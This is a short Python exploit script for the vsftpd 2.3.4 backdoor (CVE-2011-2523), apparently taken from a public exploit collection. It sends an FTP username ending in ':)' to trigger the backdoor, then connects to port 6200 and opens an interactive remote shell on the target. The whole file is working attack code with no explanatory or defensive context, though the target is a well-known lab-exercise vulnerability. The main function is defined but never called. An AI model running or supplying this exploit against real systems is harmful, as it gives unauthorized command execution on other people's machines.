#!/usr/bin/python3

from telnetlib import Telnet
import argparse
from signal import signal, SIGINT
from sys import exit

Exploit_Title = "vsftpd 2.3.4 - Backdoor Command Execution"
Date = "9-04-2021"
Version = "vsftpd 2.3.4"
Tested_on = "debian"
CVE = "CVE-2011-2523"


def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)


def main(host: str = ""):
    signal(SIGINT, handler)
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="input the address of the vulnerable host", type=str)
    args = parser.parse_args()
    host = args.host
    portFTP = 21

    user = "USER nergal:)"
    password = "PASS pass"

    tn = Telnet(host, portFTP)
    tn.read_until(b"(vsFTPd 2.3.4)")
    tn.write(user.encode('ascii') + b"\n")
    tn.read_until(b"password.")
    tn.write(password.encode('ascii') + b"\n")

    tn2 = Telnet(host, 6200)
    print('Success, shell opened')
    print('Send `exit` to quit shell')
    tn2.interact()
